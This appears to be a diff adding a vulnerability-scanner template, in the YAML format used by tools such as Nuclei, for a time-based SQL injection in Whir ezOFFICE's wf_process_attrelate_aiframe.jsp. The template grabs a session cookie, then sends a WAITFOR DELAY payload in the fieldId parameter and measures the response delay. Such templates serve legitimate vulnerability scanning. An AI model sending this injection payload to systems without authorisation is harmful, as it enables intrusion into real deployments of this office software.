@@ -1,0 +1,47 @@
+id: poc-yaml-whir-ezoffice-wf-process-attrelate-aiframe-jsp-sqli
+info:
+  name: 万户 ezOFFICE wf_process_attrelate_aiframe.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  random: '{{rand_int(2,6)}}'
+  random1: '{{to_number(random) + 1}}'
+http:
+  - raw:
+      - |
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "OASESSIONID"
+    extractors:
+      - type: regex
+        name: session_id
+        part: header
+        internal: true
+        regex:
+          - "OASESSIONID=([A-Z0-9]+);"
+  - raw:
+      - |
+        GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp?fieldId=1;WAITFOR%20DELAY%20%270:0:{{random}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: OASESSIONID={{session_id}};
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<option value=\"-1\"></option>"
+      - type: dsl
+        dsl:
+          - "duration > to_number(random) && duration < to_number(random1)"
